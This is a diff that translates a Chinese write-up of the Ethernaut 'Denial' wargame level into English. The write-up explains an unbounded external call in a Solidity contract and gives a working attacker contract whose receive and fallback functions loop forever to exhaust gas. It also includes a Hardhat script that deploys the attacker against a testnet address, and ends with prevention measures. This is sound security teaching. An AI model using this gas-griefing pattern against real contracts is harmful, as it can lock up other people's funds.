@@ -1,10 +1,10 @@
-# Ethernaut - Denial 關卡
+# Ethernaut - Denial Level
 
-## 關卡介紹
+## Level Introduction
 
-Denial 關卡要求你成為合約的 partner 並阻止 owner 提取資金。即使合約中有足夠的資金且交易的 gas 限制為 1M 或更少，仍需確保 owner 無法成功執行 withdraw() 函數。
+The Denial level requires you to become the contract's partner and prevent the owner from withdrawing funds. Even though the contract has sufficient funds and the transaction gas limit is 1M or less, you must ensure that the owner cannot successfully execute the withdraw() function.
 
-## 目標合約分析
+## Target Contract Analysis
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -42,27 +42,27 @@ contract Denial {
 }
 ```
 
-## 漏洞分析
+## Vulnerability Analysis
 
-這個合約的主要漏洞在於 `withdraw()` 函數中的 `partner.call{value: amountToSend}("")` 方法：
+The main vulnerability in this contract lies in the `partner.call{value: amountToSend}("")` method in the `withdraw()` function:
 
-1. **Gas 限制問題**：
-   - 合約使用 `call` 方法轉帳時沒有設置 gas 限制
-   - 因此 partner 合約可以消耗交易中的所有可用 gas
+1. **Gas Limit Issue**:
+   - The contract uses the `call` method for transfers without setting a gas limit
+   - Therefore, the partner contract can consume all available gas in the transaction
 
-2. **執行順序問題**：
-   - 合約先執行 partner 的轉帳，然後才執行 owner 的轉帳
-   - 如果 partner 轉帳步驟消耗完所有 gas，後續步驟將無法執行
+2. **Execution Order Issue**:
+   - The contract executes the partner's transfer first, then the owner's transfer
+   - If the partner transfer step consumes all gas, subsequent steps cannot execute
 
-3. **缺少資金保護機制**：
-   - 合約沒有防範惡意 partner 消耗過多 gas 的機制
-   - 沒有提供 owner 的緊急提款機制
+3. **Lack of Fund Protection Mechanism**:
+   - The contract has no mechanism to prevent malicious partners from consuming too much gas
+   - No emergency withdrawal mechanism is provided for the owner
 
-## 攻擊方法
+## Attack Method
 
-我們可以創建一個惡意合約，其 `receive()` 或 `fallback()` 函數會故意消耗所有可用的 gas，使 `withdraw()` 函數無法完成執行，從而阻止 owner 獲得資金。
+We can create a malicious contract whose `receive()` or `fallback()` function deliberately consumes all available gas, making the `withdraw()` function unable to complete execution, thus preventing the owner from receiving funds.
 
-### 攻擊合約
+### Attack Contract
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -74,50 +74,50 @@ interface IDenial {
 }
 
 contract AttackDenial {
-    // 目標 Denial 合約
+    // Target Denial contract
     IDenial public target;
     
     constructor(address _target) {
         target = IDenial(_target);
     }
     
-    // 設置自己為 partner
+    // Set ourselves as partner
     function attack() external {
         target.setWithdrawPartner(address(this));
     }
     
-    // 在接收以太幣時消耗所有 gas
+    // Consume all gas when receiving ether
     receive() external payable {
-        // 使用無限循環來消耗所有 gas
+        // Use infinite loop to consume all gas
         while(true) {}
     }
     
-    // 備用接收函數，以防止 receive 沒有被觸發
+    // Backup receive function in case receive is not triggered
     fallback() external payable {
-        // 同樣使用無限循環消耗所有 gas
+        // Also use infinite loop to consume all gas
         while(true) {}
     }
 }
 ```
 
-### 部署和攻擊腳本
+### Deployment and Attack Script
 
 ```typescript
 import hre from "hardhat";
 const { ethers } = hre;
 
 async function main() {
-    console.log("開始執行 Denial 合約攻擊腳本...");
+    console.log("Starting Denial contract attack script...");
 
-    // 目標合約的地址
+    // Target contract address
     const targetAddress = "0xBBa23DbF343d46966D990dc7245577D3681ba12B";
     
-    // 部署攻擊合約
+    // Deploy attack contract
     const attackFactory = await ethers.getContractFactory("AttackDenial");
     const attackContract = await attackFactory.deploy(targetAddress);
     await attackContract.waitForDeployment();
     
-    // 執行攻擊，將攻擊合約設置為 partner
+    // Execute attack, set attack contract as partner
     await attackContract.attack();
 }
 
@@ -127,43 +127,43 @@ main().catch((error) => {
 });
 ```
 
-## 攻擊原理
+## Attack Principle
 
-1. 我們部署 `AttackDenial` 合約並將目標 Denial 合約地址傳入構造函數
-2. 通過 `attack()` 函數將攻擊合約設置為 Denial 合約的 partner
-3. 當 Denial 合約執行 `withdraw()` 時，它會向攻擊合約發送資金
-4. 攻擊合約的 `receive()` 函數會執行一個無限循環，消耗所有可用 gas
-5. 由於 gas 耗盡，Denial 合約無法完成執行到 owner 轉帳的部分
-6. 因此 owner 無法提取資金，我們成功阻止了 withdraw 操作
+1. We deploy the `AttackDenial` contract and pass the target Denial contract address to the constructor
+2. Through the `attack()` function, we set the attack contract as the Denial contract's partner
+3. When the Denial contract executes `withdraw()`, it sends funds to the attack contract
+4. The attack contract's `receive()` function executes an infinite loop, consuming all available gas
+5. Due to gas exhaustion, the Denial contract cannot complete execution to the owner transfer part
+6. Therefore, the owner cannot withdraw funds, and we successfully prevent the withdraw operation
 
-## 執行攻擊
+## Execute Attack
 
 ```shell
 npx hardhat run scripts/attackDenial.ts --network optimismSepolia
 ```
 
-## 防範措施
+## Prevention Measures
 
-為防止類似的漏洞，合約開發者應該：
+To prevent similar vulnerabilities, contract developers should:
 
-1. **限制 Gas 使用量**：
-   - 使用 `call{gas: specificAmount}` 來限制轉發給外部合約的 gas
-   - 或使用 `transfer()` 或 `send()` 方法（內建 2300 gas 限制）
+1. **Limit Gas Usage**:
+   - Use `call{gas: specificAmount}` to limit gas forwarded to external contracts
+   - Or use `transfer()` or `send()` methods (built-in 2300 gas limit)
 
-2. **使用拉取模式（Pull Pattern）**：
-   - 改用「拉取」而非「推送」模式發送資金
-   - 讓接收者自行調用提款函數，而不是主動發送
+2. **Use Pull Pattern**:
+   - Switch to "pull" rather than "push" mode for sending funds
+   - Let recipients call withdrawal functions themselves instead of actively sending
 
-3. **Checks-Effects-Interactions 模式**：
-   - 先進行所有狀態變更，最後才與外部合約交互
-   - 這樣即使外部調用失敗，狀態也已經正確更新
+3. **Checks-Effects-Interactions Pattern**:
+   - Perform all state changes first, then interact with external contracts last
+   - This way, even if external calls fail, the state has been correctly updated
 
-4. **添加緊急提款機制**：
-   - 為 owner 提供緊急提款函數
-   - 在特殊情況下繞過正常提款流程
+4. **Add Emergency Withdrawal Mechanism**:
+   - Provide emergency withdrawal functions for the owner
+   - Bypass normal withdrawal process in special circumstances
 
-## 學習心得
+## Learning Insights
 
-這個關卡展示了 Solidity 中 `call` 方法的危險性：它會轉發所有可用的 gas，且不會自動回滾。相比之下，`transfer` 和 `send` 方法限制 gas 為 2300 單位，可以減少此類攻擊的風險。
+This level demonstrates the dangers of the `call` method in Solidity: it forwards all available gas and doesn't automatically revert. In contrast, the `transfer` and `send` methods limit gas to 2300 units, which can reduce the risk of such attacks.
 
-總之，在處理資金轉移時，始終要謹慎設計交互模式，並遵循已驗證的安全模式。
+In summary, when handling fund transfers, always carefully design interaction patterns and follow verified security patterns.
